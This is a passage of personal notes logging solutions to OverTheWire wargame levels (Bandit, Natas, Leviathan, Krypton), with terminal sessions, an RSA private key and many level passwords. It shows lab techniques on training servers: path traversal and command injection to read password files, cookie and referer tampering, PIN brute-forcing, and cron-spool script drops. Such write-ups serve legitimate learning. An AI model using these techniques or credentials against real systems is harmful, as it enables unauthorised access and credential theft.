+    0070 - 27 2a 02 08 55 e4 93 94-b8 8a d9 3f e8 94 78 4e   '*..U......?..xN
+    0080 - ac ce b7 58 2a ed 8c 3f-e9 ca fe 56 56 9f a9 b0   ...X*..?...VV...
+    0090 - 32 10 8e f7 06 c6 78 fb-d6 22 d0 3c df f6 7c 1d   2.....x..".<..|.
+
+    Start Time: 1525968399
+    Timeout   : 300 (sec)
+    Verify return code: 18 (self signed certificate)
+---
+cluFn7wTiGryunymYOu4RcffSxQluehd
+Correct!
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+
+closed
+
+
+
+
+bandit17@bandit:~$ ls
+passwords.new  passwords.old
+bandit17@bandit:~$ man diff
+bandit17@bandit:~$ diff passwords.new passwords.old 
+42c42
+< kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+---
+> 6vcSC74ROI95NqkKaeEC2ABVMDX9TyUr
+bandit17@bandit:~$
+
+bandit17@bandit:~$ ssh -t bandit18@localhost cat readme
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/bandit17/.ssh/known_hosts).
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0640 for '/home/bandit17/.ssh/id_rsa' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "/home/bandit17/.ssh/id_rsa": bad permissions
+bandit18@localhost's password: 
+IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+Connection to localhost closed.
+bandit17@bandit:~$
+
+andit19@bandit:~$ ls
+bandit20-do
+bandit19@bandit:~$ ls -al
+total 28
+drwxr-xr-x  2 root     root     4096 Dec 28 14:34 .
+drwxr-xr-x 29 root     root     4096 Dec 28 14:34 ..
+-rw-r--r--  1 root     root      220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 root     root     3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 root     root      655 Jun 24  2016 .profile
+-rwsr-x---  1 bandit20 bandit19 7408 Dec 28 14:34 bandit20-do
+bandit19@bandit:~$ setuid
+The program 'setuid' is currently not installed. To run 'setuid' please ask your administrator to install the package 'super'
+bandit19@bandit:~$ file bandit20-do 
+bandit20-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1c05d80e62cd205a3497b870e8294402424a4f7c, not stripped
+bandit19@bandit:~$ bandit20-do
+bandit20-do: command not found
+bandit19@bandit:~$ ./bandit20-do 
+Run a command as another user.
+  Example: ./bandit20-do id
+bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/
+cat: /etc/bandit_pass/: Is a directory
+bandit19@bandit:~$ ls /etc/bandit_pass/
+bandit0   bandit11  bandit14  bandit17  bandit2   bandit22  bandit25  bandit4  bandit7
+bandit1   bandit12  bandit15  bandit18  bandit20  bandit23  bandit26  bandit5  bandit8
+bandit10  bandit13  bandit16  bandit19  bandit21  bandit24  bandit3   bandit6  bandit9
+bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20 
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+bandit19@bandit:~$
+
+
+bandit20@bandit:~$ nc -l 4444
+bandit20@bandit:~$ nc -l 4444
+bandit20@bandit:~$ nc -l 4444 < /etc/bandit_pass/bandit20
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+bandit20@bandit:~$
+
+bandit20@bandit:~$ ./suconnect 4444
+Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+Password matches, sending next password
+bandit20@bandit:~$ tmux attach
+[detached (from session 0)]
+bandit20@bandit:~$
+
+
+
+bandit21@bandit:~$ cat /etc/cron.d
+cat: /etc/cron.d: Is a directory
+bandit21@bandit:~$ ls /etc/cron.d/
+cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  popularity-contest
+bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+bandit21@bandit:~$ ls -al /etc/cron.d/cronjob_bandit22
+-rw-r--r-- 1 root root 120 Dec 28 14:34 /etc/cron.d/cronjob_bandit22
+bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh 
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit21@bandit:~$ man tail  
+bandit21@bandit:~$ tail -f /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+andit22@bandit:/usr/bin$ ./cron
+cronjob_bandit22.sh  cronjob_bandit23.sh  crontab              
+bandit22@bandit:/usr/bin$ ./cron
+cronjob_bandit22.sh  cronjob_bandit23.sh  crontab              
+bandit22@bandit:/usr/bin$ ./cron
+cronjob_bandit22.sh  cronjob_bandit23.sh  crontab              
+bandit22@bandit:/usr/bin$ ./cronjob_bandit23.sh 
+Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3
+bandit22@bandit:/usr/bin$ cat cronjob_bandit23.sh 
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+bandit22@bandit:/usr/bin$ echo I am user bandit22 | md5sum
+8169b67bd894ddbb4412f91573b38db3  -
+bandit22@bandit:/usr/bin$ echo I am user bandit22 | md5sum | cut -d ' ' -f 1
+8169b67bd894ddbb4412f91573b38db3
+bandit22@bandit:/usr/bin$ cat /tmp/8169b67bd894ddbb4412f91573b38db3
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+bandit22@bandit:/usr/bin$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:/usr/bin$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+bandit22@bandit:/usr/bin$
+
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh 
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+    echo "Handling $i"
+    timeout -s 9 60 ./$i
+    rm -f ./$i
+    fi
+done
+
+
+bandit23@bandit:~$ ls -al /tmp/medir/pass.sh 
+-rwxrwxrwx 1 bandit23 bandit23 66 May 15 16:16 /tmp/medir/pass.sh
+bandit23@bandit:~$ cp /tmp/medir/pass.sh /var/spool/bandit24/pass.sh
+bandit23@bandit:~$ cd /tmp/medir/
+bandit23@bandit:/tmp/medir$ dir -a
+.  ..  bandit24  pass.sh
+bandit23@bandit:/tmp/medir$ ls -al
+total 720
+drwxrwxr-x    2 bandit23 bandit23   4096 May 15 16:18 .
+drwxrwx-wt 1888 root     root     724992 May 15 21:16 ..
+-rw-rw-r--    1 bandit23 bandit23      0 May 15 16:18 bandit24
+-rwxrwxrwx    1 bandit23 bandit23     66 May 15 16:16 pass.sh
+bandit23@bandit:/tmp/medir$ chmod 777 bandit24 
+bandit23@bandit:/tmp/medir$ cp pass.sh /var/spool/bandit24/pass.sh
+bandit23@bandit:/tmp/medir$ cat bandit24 
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+bandit23@bandit:/tmp/medir$ 
+
+bandit24@bandit:/tmp/medir$ passwd='UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
+bandit24@bandit:/tmp/medir$ for i in {0000..9999}; do echo $passwd' '$i >> tryme.txt; done
+bandit24@bandit:/tmp/medir$ nc localhost 30002                  
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+^C
+bandit24@bandit:/tmp/medir$ cat tryme.txt | nc localhost 30002 
+rong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+bandit24@bandit:/tmp/medir$ 
+
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+Natas
+
+
+
+
+
+
+<html>
+
+
+
+
+<head>
+
+
+<!-- This stuff in the header has nothing to do with the level -->
+
+
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+
+
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+
+
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+
+
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+
+
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+
+
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+
+
+<script>var wechallinfo = { "level": "natas0", "pass": "natas0" };</script></head>
+
+
+<body>
+
+
+<h1>natas0</h1>
+
+
+<div id="content">
+
+
+You can find the password for the next level on this page.
+
+
+
+
+
+
+<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
+
+
+</div>
+
+
+</body>
+
+
+</html>
+
+
+
+
+
+
+<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi →
+
+# username:password
+alice:BYNdCesZqW
+bob:jw2ueICLvT
+charlie:G5vCxkVV3m
+natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+eve:zo4mJWyNj2
+mallory:9urtcpzBmH
+
+
+natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+
+jmcshannon@qwerty-english-v4x1:~/wordlists$ curl -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ --referer http://natas5.natas.labs.overthewire.org http://natas4.natas.labs.overthewire.org
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas4", "pass": "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" };</script></head>
+<body>
+<h1>natas4</h1>
+<div id="content">
+
+Access disallowed. You are visiting from "http://natas5.natas.labs.overthewire.org" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
+<br/>
+<div id="viewsource"><a href="index.php">Refresh page</a></div>
+</div>
+</body>
+</html>
+jmcshannon@qwerty-english-v4x1:~/wordlists$ curl -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas4", "pass": "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" };</script></head>
+<body>
+<h1>natas4</h1>
+<div id="content">
+
+Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+<br/>
+<div id="viewsource"><a href="index.php">Refresh page</a></div>
+</div>
+</body>
+</html>
+jmcshannon@qwerty-english-v4x1:~/wordlists$ 
+
+Use burp suite for proxy and change value of logged in cookie to 1
+
+Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+Natas6 has a script that exposes a page on the server. That page gets highlighted and
+
+<?
+$secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+
+Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 Input secret: 
+
+
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+Take string from source, hex to binary conversion, string reverse, base 64 decode, throw away garbage.
+Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl Input secret:
+
+
+Natas9 has unsanitized input allowing us to use bash commands. Search for a keyword or part of a keyword  that appears in the dictionary (use ls to see words) then use the ; like you would in a loop at the cli and cat /etc/natas_webpass/natas10
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+Output:
+.htaccess:AuthType Basic
+.htaccess: AuthName "Authentication required"
+.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
+.htaccess: require valid-user
+.htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0
+/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+
+
+ 
+
+Leviathan
+
+leviathan0@leviathan:~$ ls -al
+total 24
+drwxr-xr-x  3 root       root       4096 May 10 18:27 .
+drwxr-xr-x 10 root       root       4096 May 10 18:27 ..
+drwxr-x---  2 leviathan1 leviathan0 4096 May 10 18:27 .backup
+-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
+-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
+-rw-r--r--  1 root       root        675 May 15  2017 .profile
+leviathan0@leviathan:~$ cd .backup/
+leviathan0@leviathan:~/.backup$ ls -al
+total 140
+drwxr-x--- 2 leviathan1 leviathan0   4096 May 10 18:27 .
+drwxr-xr-x 3 root       root         4096 May 10 18:27 ..
+-rw-r----- 1 leviathan1 leviathan0 133259 May 10 18:27 bookmarks.html
+leviathan0@leviathan:~/.backup$ grep leviathan1 bookmarks.html 
+<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
+leviathan0@leviathan:~/.backup$ 
+
+leviathan1@leviathan:~$ ./check 
+password: ^C
+leviathan1@leviathan:~$ strace ./check 
+execve("./check", ["./check"], [/* 20 vars */]) = 0
+strace: [ Process PID=22580 runs in 32 bit mode. ]
+brk(NULL)                               = 0x56558000
+fcntl64(0, F_GETFD)                     = 0
+fcntl64(1, F_GETFD)                     = 0
+fcntl64(2, F_GETFD)                     = 0
+access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fd2000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=35506, ...}) = 0
+mmap2(NULL, 35506, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fc9000
+close(3)                                = 0
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\204\1\0004\0\0\0"..., 512) = 512
+fstat64(3, {st_mode=S_IFREG|0755, st_size=1787812, ...}) = 0
+mmap2(NULL, 1796604, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7e12000
+mmap2(0xf7fc3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0xf7fc3000
+mmap2(0xf7fc6000, 10748, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7fc6000
+close(3)                                = 0
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7e10000
+set_thread_area({entry_number:-1, base_addr:0xf7e10700, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)
+mprotect(0xf7fc3000, 8192, PROT_READ)   = 0
+mprotect(0x56556000, 4096, PROT_READ)   = 0
+mprotect(0xf7ffc000, 4096, PROT_READ)   = 0
+munmap(0xf7fc9000, 35506)               = 0
+fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 10), ...}) = 0
+brk(NULL)                               = 0x56558000
+brk(0x56579000)                         = 0x56579000
+fstat64(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 10), ...}) = 0
+write(1, "password: ", 10password: )              = 10
+read(0, 
+"\n", 1024)                     = 1
+read(0, 
+"\n", 1024)                     = 1
+read(0, 10password
+"10password\n", 1024)           = 11
+write(1, "Wrong password, Good Bye ...\n", 29Wrong password, Good Bye ...
+) = 29
+_llseek(0, -10, 0xffffd578, SEEK_CUR)   = -1 ESPIPE (Illegal seek)
+exit_group(0)                           = ?
++++ exited with 0 +++
+leviathan1@leviathan:~$ ltrace ./check 
+__libc_start_main(0x565556c0, 1, 0xffffd754, 0x565557a0 <unfinished ...>
+printf("password: ")                                   = 10
+getchar(0xf7fc5000, 0xffffd754, 0x65766f6c, 0x646f6700password: 
+) = 10
+getchar(0xf7fc5000, 0xffffd754, 0x65766f6c, 0x646f6700
+) = 10
+getchar(0xf7fc5000, 0xffffd754, 0x65766f6c, 0x646f6700
+) = 10
+strcmp("\n\n\n", "sex")                                = -1
+puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
+)                   = 29
++++ exited (status 0) +++
+leviathan1@leviathan:~$ ./check 
+password: sex
+$ cat /etc/leviathan_pass/leviathan2
+ougahZi8Ta
+$ 
+
+Krypton
+
+jmcshannon@captain:~$ vim test
+jmcshannon@captain:~$ base64 -d test 
+KRYPTONISGREATjmcshannon@captain:~$ 
+
+
+krypton1@krypton:/krypton/krypton2$ cat README 
+cat: README: Permission denied
+krypton1@krypton:/krypton/krypton2$ ls -al
+total 32
+drwxr-xr-x 2 root     root     4096 May 14 04:18 .
+drwxr-xr-x 8 root     root     4096 May 14 04:18 ..
+-rw-r----- 1 krypton2 krypton2 1815 May 14 04:18 README
+-rwsr-x--- 1 krypton3 krypton2 9010 May 14 04:18 encrypt
+-rw-r----- 1 krypton3 krypton3   27 May 14 04:18 keyfile.dat
+-rw-r----- 1 krypton2 krypton2   13 May 14 04:18 krypton3
+krypton1@krypton:/krypton/krypton2$ cd ../krypton1
+krypton1@krypton:/krypton/krypton1$ ls
+README  krypton2
+krypton1@krypton:/krypton/krypton1$ cat README 
+Welcome to Krypton!
+
+This game is intended to give hands on experience with cryptography
+and cryptanalysis.  The levels progress from classic ciphers, to modern,
+easy to harder.
+
+Although there are excellent public tools, like cryptool,to perform
+the simple analysis, we strongly encourage you to try and do these
+without them for now.  We will use them in later excercises.
+
+** Please try these levels without cryptool first **
+
+
+The first level is easy.  The password for level 2 is in the file 
+'krypton2'.  It is 'encrypted' using a simple rotation called ROT13.  
+It is also in non-standard ciphertext format.  When using alpha characters for
+cipher text it is normal to group the letters into 5 letter clusters, 
+regardless of word boundaries.  This helps obfuscate any patterns.
+
+This file has kept the plain text word boundaries and carried them to
+the cipher text.
+
+Enjoy!
+krypton1@krypton:/krypton/krypton1$ ls
+README  krypton2
+krypton1@krypton:/krypton/krypton1$ cat krypton2 
+YRIRY GJB CNFFJBEQ EBGGRA
+krypton1@krypton:/krypton/krypton1$ python3
+Python 3.4.3 (default, Nov 28 2017, 16:41:13) 
+[GCC 4.8.4] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import codecs
+>>> print(codecs.decode("YRIRY GJB CNFFJBEQ EBGGRA", "rot-13"))
+LEVEL TWO PASSWORD ROTTEN
+>>> 
+
+
